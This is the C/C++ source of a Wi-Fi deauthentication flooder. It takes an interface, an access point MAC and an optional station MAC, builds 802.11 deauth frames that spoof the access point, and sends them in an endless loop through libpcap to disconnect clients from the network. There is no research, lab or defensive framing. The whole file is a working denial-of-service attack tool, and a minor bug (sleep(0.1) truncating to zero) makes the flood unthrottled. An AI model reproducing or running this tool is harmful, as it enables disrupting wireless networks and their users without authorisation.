#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
typedef struct radio_header{
    u_int8_t        it_version;     /* set to 0 */
    u_int8_t        it_pad;
    u_int16_t       it_len;         /* entire length */
    u_int32_t       it_present;     /* fields present */
}radio;

typedef struct deauth_pakcet{
    u_int16_t type;
    u_int16_t duration;
    u_int8_t destination[6];
    u_int8_t source[6];
    u_int8_t bssid[6];
    u_int16_t pad;


}deauth;

typedef struct wireless_mgnt{
    u_int16_t pad2;
}wireless;

struct A{
    radio r;
    deauth d;
    wireless w;
};



int main(int argc,char *argv[]){


    if(argc<3){
        printf("usage : <interface> <ap mac> [<station mac>]\n");
        return 0;
    }
    if(argc<4){
        printf("you can make AP -> STATIC unicast frame \n");
        printf("usage : <interface> <ap mac> [<station mac>]");
    }


    pcap_t *fp;

    radio rd;
    rd.it_version=0x00;
    rd.it_pad=0x00;
    rd.it_len=0x0008;
    rd.it_present=0x00000000;

    wireless wm;
    wm.pad2=0x0007;

    deauth dp;
    dp.type=0x00c0;
    dp.duration=0x0000;
    dp.pad=0x0000;
    memset(dp.destination,0xFF,sizeof(dp.destination));



    int temp=0;
    for(int i=0;i<6;i++){
        int tmp[2];
        tmp[0]=argv[2][temp++];
        tmp[1]=argv[2][temp++];
        for(int j=0;j<2;j++){
            if(48<=tmp[j]&&tmp[j]<=57){
                if(j==0) tmp[j]=(tmp[j]-48)*16;
                else tmp[j]-=48;
            }
            else if(65<=tmp[j]&&tmp[j]<=70) {
                if(j==0) tmp[j]=(tmp[j]-55)*16;
                else tmp[j]-=55;
            }
            else {
                if(j==0) tmp[j]=(tmp[j]-87)*16;
                else tmp[j]-=87;
            }
        }
        dp.source[i]=tmp[0]+tmp[1];
        dp.bssid[i]=tmp[0]+tmp[1];
        temp++;
    }


    if(argc==4){
        temp=0;
        for(int i=0;i<6;i++){
            int tmp[2];
            tmp[0]=argv[3][temp++];
            tmp[1]=argv[3][temp++];
            for(int j=0;j<2;j++){
                if(48<=tmp[j]&&tmp[j]<=57){
                    if(j==0) tmp[j]=(tmp[j]-48)*16;
                    else tmp[j]-=48;
                }
                else if(65<=tmp[j]&&tmp[j]<=70) {
                    if(j==0) tmp[j]=(tmp[j]-55)*16;
                    else tmp[j]-=55;
                }
                else {
                    if(j==0) tmp[j]=(tmp[j]-87)*16;
                    else tmp[j]-=87;
                }
            }
            dp.destination[i]=tmp[0]+tmp[1];
            temp++;
        }


    }




    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev;
    dev = argv[1];



    fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (fp == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
    }



    struct A body;
/*
    body.r.it_version=rd.it_version;
    body.r.it_len=rd.it_len;
    body.r.it_present=rd.it_present;
    body.r.it_pad=rd.it_pad;
    body.d.pad=dp.pad;
    body.d.type=dp.type;
    body.w.pad2=0x0007;
    body.d.duration=dp.duration;
    for(int i=0;i<6;i++){
        body.d.source[i]=dp.source[i];
        body.d.bssid[i]=dp.bssid[i];
    }
    body.d.destination[0]=0xFF;
    body.d.destination[1]=0xFF;
    body.d.destination[2]=0xFF;
    body.d.destination[3]=0xFF;
    body.d.destination[4]=0xFF;
    body.d.destination[5]=0xFF;
*/

    body.r=rd;
    body.d=dp;
    body.w=wm;

    while(1){
        pcap_sendpacket(fp,reinterpret_cast<const u_char*>(&body),(sizeof(body)-2));
        sleep(0.1);

    }


}
